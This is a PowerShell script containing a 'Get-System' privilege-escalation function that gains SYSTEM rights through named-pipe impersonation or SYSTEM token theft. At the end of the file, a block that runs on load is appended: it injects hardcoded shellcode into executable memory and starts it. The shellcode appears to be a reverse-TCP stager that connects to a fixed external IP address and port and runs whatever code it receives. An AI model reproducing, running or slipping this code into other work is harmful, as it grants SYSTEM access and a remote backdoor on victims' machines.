function Get-System {

    [CmdletBinding(DefaultParameterSetName = 'NamedPipe')]
    param(
        [Parameter(ParameterSetName = "NamedPipe")]
        [Parameter(ParameterSetName = "Token")]
        [String]
        [ValidateSet("NamedPipe", "Token")]
        $Technique = 'NamedPipe',

        [Parameter(ParameterSetName = "NamedPipe")]
        [String]
        $ServiceName = 'TestSVC',

        [Parameter(ParameterSetName = "NamedPipe")]
        [String]
        $PipeName = 'TestSVC',

        [Parameter(ParameterSetName = "RevToSelf")]
        [Switch]
        $RevToSelf,

        [Parameter(ParameterSetName = "WhoAmI")]
        [Switch]
        $WhoAmI
    )

    $ErrorActionPreference = "Stop"

    
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    
    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    
    
    function Local:Get-SystemNamedPipe {
        param(
            [String]
            $ServiceName = "TestSVC",

            [String]
            $PipeName = "TestSVC"
        )

        $Command = "%COMSPEC% /C start %COMSPEC% /C `"timeout /t 3 >nul&&echo $PipeName > \\.\pipe\$PipeName`""

        
        $PipeSecurity = New-Object System.IO.Pipes.PipeSecurity
        $AccessRule = New-Object System.IO.Pipes.PipeAccessRule( "Everyone", "ReadWrite", "Allow" )
        $PipeSecurity.AddAccessRule($AccessRule)
        $Pipe = New-Object System.IO.Pipes.NamedPipeServerStream($PipeName,"InOut",100, "Byte", "None", 1024, 1024, $PipeSecurity)

        $PipeHandle = $Pipe.SafePipeHandle.DangerousGetHandle()

        
        
        $ImpersonateNamedPipeClientAddr = Get-ProcAddress Advapi32.dll ImpersonateNamedPipeClient
        $ImpersonateNamedPipeClientDelegate = Get-DelegateType @( [Int] ) ([Int])
        $ImpersonateNamedPipeClient = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateNamedPipeClientAddr, $ImpersonateNamedPipeClientDelegate)

        $CloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle
        $CloseServiceHandleDelegate = Get-DelegateType @( [IntPtr] ) ([Int])
        $CloseServiceHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate)

        $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA
        $OpenSCManagerADelegate = Get-DelegateType @( [String], [String], [Int]) ([IntPtr])
        $OpenSCManagerA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)
        
        $OpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA
        $OpenServiceADelegate = Get-DelegateType @( [IntPtr], [String], [Int]) ([IntPtr])
        $OpenServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAAddr, $OpenServiceADelegate)
      
        $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA
        $CreateServiceADelegate = Get-DelegateType @( [IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])
        $CreateServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)

        $StartServiceAAddr = Get-ProcAddress Advapi32.dll StartServiceA
        $StartServiceADelegate = Get-DelegateType @( [IntPtr], [Int], [Int]) ([IntPtr])
        $StartServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAAddr, $StartServiceADelegate)

        $DeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService
        $DeleteServiceDelegate = Get-DelegateType @( [IntPtr] ) ([IntPtr])
        $DeleteService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeleteServiceAddr, $DeleteServiceDelegate)

        $GetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError
        $GetLastErrorDelegate = Get-DelegateType @() ([Int])
        $GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)

        
        
        
        Write-Verbose "Opening service manager"
        $ManagerHandle = $OpenSCManagerA.Invoke("\\localhost", "ServicesActive", 0xF003F)
        Write-Verbose "Service manager handle: $ManagerHandle"

        
        if ($ManagerHandle -and ($ManagerHandle -ne 0)) {

            
            
            
            
            
            Write-Verbose "Creating new service: '$ServiceName'"
            try {
                $ServiceHandle = $CreateServiceA.Invoke($ManagerHandle, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, $Command, $null, $null, $null, $null, $null)
                $err = $GetLastError.Invoke()
            }
            catch {
                Write-Warning "Error creating service : $_"
                $ServiceHandle = 0
            }
            Write-Verbose "CreateServiceA Handle: $ServiceHandle"

            if ($ServiceHandle -and ($ServiceHandle -ne 0)) {
                $Success = $True
                Write-Verbose "Service successfully created"

                
                Write-Verbose "Closing service handle"
                $Null = $CloseServiceHandle.Invoke($ServiceHandle)

                
                Write-Verbose "Opening the service '$ServiceName'"
                $ServiceHandle = $OpenServiceA.Invoke($ManagerHandle, $ServiceName, 0xF003F)
                Write-Verbose "OpenServiceA handle: $ServiceHandle"

                if ($ServiceHandle -and ($ServiceHandle -ne 0)){

                    
                    Write-Verbose "Starting the service"
                    $val = $StartServiceA.Invoke($ServiceHandle, $null, $null)
                    $err = $GetLastError.Invoke()

                    
                    if ($val -ne 0){
                        Write-Verbose "Service successfully started"
                        
                        Start-Sleep -s 1
                    }
                    else{
                        if ($err -eq 1053){
                            Write-Verbose "Command didn't respond to start"
                        }
                        else{
                            Write-Warning "StartService failed, LastError: $err"
                        }
                        
                        Start-Sleep -s 1
                    }

                    
                    
                    Write-Verbose "Deleting the service '$ServiceName'"
                    $val = $DeleteService.invoke($ServiceHandle)
                    $err = $GetLastError.Invoke()

                    if ($val -eq 0){
                        Write-Warning "DeleteService failed, LastError: $err"
                    }
                    else{
                        Write-Verbose "Service successfully deleted"
                    }
                
                    
                    Write-Verbose "Closing the service handle"
                    $val = $CloseServiceHandle.Invoke($ServiceHandle)
                    Write-Verbose "Service handle closed off"
                }
                else {
                    Write-Warning "[!] OpenServiceA failed, LastError: $err"
                }
            }

            else {
                Write-Warning "[!] CreateService failed, LastError: $err"
            }

            
            Write-Verbose "Closing the manager handle"
            $Null = $CloseServiceHandle.Invoke($ManagerHandle)
        }
        else {
            
            Write-Warning "[!] OpenSCManager failed, LastError: $err"
        }

        if($Success) {
            Write-Verbose "Waiting for pipe connection"
            $Pipe.WaitForConnection()

            $Null = (New-Object System.IO.StreamReader($Pipe)).ReadToEnd()

            $Out = $ImpersonateNamedPipeClient.Invoke([Int]$PipeHandle)
            Write-Verbose "ImpersonateNamedPipeClient: $Out"
        }

        
        $Pipe.Dispose()
    }

    
    
    
    Function Local:Get-SystemToken {
        [CmdletBinding()] param()

        $DynAssembly = New-Object Reflection.AssemblyName('AdjPriv')
        $AssemblyBuilder = [Appdomain]::Currentdomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('AdjPriv', $False)
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'

        $TokPriv1LuidTypeBuilder = $ModuleBuilder.DefineType('TokPriv1Luid', $Attributes, [System.ValueType])
        $TokPriv1LuidTypeBuilder.DefineField('Count', [Int32], 'Public') | Out-Null
        $TokPriv1LuidTypeBuilder.DefineField('Luid', [Int64], 'Public') | Out-Null
        $TokPriv1LuidTypeBuilder.DefineField('Attr', [Int32], 'Public') | Out-Null
        $TokPriv1LuidStruct = $TokPriv1LuidTypeBuilder.CreateType()

        $LuidTypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType])
        $LuidTypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $LuidTypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LuidStruct = $LuidTypeBuilder.CreateType()

        $Luid_and_AttributesTypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType])
        $Luid_and_AttributesTypeBuilder.DefineField('Luid', $LuidStruct, 'Public') | Out-Null
        $Luid_and_AttributesTypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $Luid_and_AttributesStruct = $Luid_and_AttributesTypeBuilder.CreateType()

        $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        $ConstructorValue = [Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

        $TokenPrivilegesTypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType])
        $TokenPrivilegesTypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $PrivilegesField = $TokenPrivilegesTypeBuilder.DefineField('Privileges', $Luid_and_AttributesStruct.MakeArrayType(), 'Public')
        $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 1))
        $PrivilegesField.SetCustomAttribute($AttribBuilder)
        $TokenPrivilegesStruct = $TokenPrivilegesTypeBuilder.CreateType()

        $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder(
            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),
            'advapi32.dll',
            @([Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')),
            @([Bool] $True)
        )

        $AttribBuilder2 = New-Object Reflection.Emit.CustomAttributeBuilder(
            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),
            'kernel32.dll',
            @([Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')),
            @([Bool] $True)
        )

        $Win32TypeBuilder = $ModuleBuilder.DefineType('Win32Methods', $Attributes, [ValueType])
        $Win32TypeBuilder.DefinePInvokeMethod(
            'OpenProcess',
            'kernel32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [IntPtr],
            @([UInt32], [Bool], [UInt32]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder2)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'CloseHandle',
            'kernel32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder2)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'DuplicateToken',
            'advapi32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [Int32], [IntPtr].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'SetThreadToken',
            'advapi32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [IntPtr]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'OpenProcessToken',
            'advapi32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [UInt32], [IntPtr].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'LookupPrivilegeValue',
            'advapi32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([String], [String], [IntPtr].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'AdjustTokenPrivileges',
            'advapi32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [Bool], $TokPriv1LuidStruct.MakeByRefType(),[Int32], [IntPtr], [IntPtr]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder)
        
        $Win32Methods = $Win32TypeBuilder.CreateType()

        $Win32Native = [Int32].Assembly.GetTypes() | ? {$_.Name -eq 'Win32Native'}
        $GetCurrentProcess = $Win32Native.GetMethod(
            'GetCurrentProcess',
            [Reflection.BindingFlags] 'NonPublic, Static'
        )
            
        $SE_PRIVILEGE_ENABLED = 0x00000002
        $STANDARD_RIGHTS_REQUIRED = 0x000F0000
        $STANDARD_RIGHTS_READ = 0x00020000
        $TOKEN_ASSIGN_PRIMARY = 0x00000001
        $TOKEN_DUPLICATE = 0x00000002
        $TOKEN_IMPERSONATE = 0x00000004
        $TOKEN_QUERY = 0x00000008
        $TOKEN_QUERY_SOURCE = 0x00000010
        $TOKEN_ADJUST_PRIVILEGES = 0x00000020
        $TOKEN_ADJUST_GROUPS = 0x00000040
        $TOKEN_ADJUST_DEFAULT = 0x00000080
        $TOKEN_ADJUST_SESSIONID = 0x00000100
        $TOKEN_READ = $STANDARD_RIGHTS_READ -bor $TOKEN_QUERY
        $TOKEN_ALL_ACCESS = $STANDARD_RIGHTS_REQUIRED -bor
            $TOKEN_ASSIGN_PRIMARY -bor
            $TOKEN_DUPLICATE -bor
            $TOKEN_IMPERSONATE -bor
            $TOKEN_QUERY -bor
            $TOKEN_QUERY_SOURCE -bor
            $TOKEN_ADJUST_PRIVILEGES -bor
            $TOKEN_ADJUST_GROUPS -bor
            $TOKEN_ADJUST_DEFAULT -bor
            $TOKEN_ADJUST_SESSIONID

        [long]$Luid = 0

        $tokPriv1Luid = [Activator]::CreateInstance($TokPriv1LuidStruct)
        $tokPriv1Luid.Count = 1
        $tokPriv1Luid.Luid = $Luid
        $tokPriv1Luid.Attr = $SE_PRIVILEGE_ENABLED

        $RetVal = $Win32Methods::LookupPrivilegeValue($Null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid)

        $htoken = [IntPtr]::Zero
        $RetVal = $Win32Methods::OpenProcessToken($GetCurrentProcess.Invoke($Null, @()), $TOKEN_ALL_ACCESS, [ref]$htoken)

        $tokenPrivileges = [Activator]::CreateInstance($TokenPrivilegesStruct)
        $RetVal = $Win32Methods::AdjustTokenPrivileges($htoken, $False, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero)

        if(-not($RetVal)) {
            Write-Error "AdjustTokenPrivileges failed, RetVal : $RetVal" -ErrorAction Stop
        }
        
        $LocalSystemNTAccount = (New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList ([Security.Principal.WellKnownSidType]::'LocalSystemSid', $null)).Translate([Security.Principal.NTAccount]).Value

        $SystemHandle = Get-WmiObject -Class Win32_Process | ForEach-Object {
            try {
                $OwnerInfo = $_.GetOwner()
                if ($OwnerInfo.Domain -and $OwnerInfo.User) {
                    $OwnerString = "$($OwnerInfo.Domain)\$($OwnerInfo.User)".ToUpper()

                    if ($OwnerString -eq $LocalSystemNTAccount.ToUpper()) {
                        $Process = Get-Process -Id $_.ProcessId

                        $Handle = $Win32Methods::OpenProcess(0x0400, $False, $Process.Id)
                        if ($Handle) {
                            $Handle
                        }
                    }
                }
            }
            catch {}
        } | Where-Object {$_ -and ($_ -ne 0)} | Select -First 1
        
        if ((-not $SystemHandle) -or ($SystemHandle -eq 0)) {
            Write-Error 'Unable to obtain a handle to a system process.'
        } 
        else {
            [IntPtr]$SystemToken = [IntPtr]::Zero
            $RetVal = $Win32Methods::OpenProcessToken(([IntPtr][Int] $SystemHandle), ($TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE), [ref]$SystemToken);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

            Write-Verbose "OpenProcessToken result: $RetVal"
            Write-Verbose "OpenProcessToken result: $LastError"

            [IntPtr]$DulicateTokenHandle = [IntPtr]::Zero
            $RetVal = $Win32Methods::DuplicateToken($SystemToken, 2, [ref]$DulicateTokenHandle);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

            Write-Verbose "DuplicateToken result: $LastError"

            $RetVal = $Win32Methods::SetThreadToken([IntPtr]::Zero, $DulicateTokenHandle);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if(-not($RetVal)) {
                Write-Error "SetThreadToken failed, RetVal : $RetVal" -ErrorAction Stop
            }

            Write-Verbose "SetThreadToken result: $LastError"
            $null = $Win32Methods::CloseHandle($Handle)
        }
    }

    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        Write-Error "Script must be run as administrator" -ErrorAction Stop
    }

    if([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') {
        Write-Error "Script must be run in STA mode, relaunch powershell.exe with -STA flag" -ErrorAction Stop
    }

    if($PSBoundParameters['WhoAmI']) {
        Write-Output "$([Environment]::UserDomainName)\$([Environment]::UserName)"
        return
    }

    elseif($PSBoundParameters['RevToSelf']) {
        $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
        $RevertToSelfDelegate = Get-DelegateType @() ([Bool])
        $RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)

        $RetVal = $RevertToSelf.Invoke()
        if($RetVal) {
            Write-Output "RevertToSelf successful."
        }
        else {
            Write-Warning "RevertToSelf failed."
        }
        Write-Output "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
    }

    else {
        if($Technique -eq 'NamedPipe') {
            
            Get-SystemNamedPipe -ServiceName $ServiceName -PipeName $PipeName
        }
        else {
            
            Get-SystemToken
        }
        Write-Output "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xd5,0x39,0x95,0xd6,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

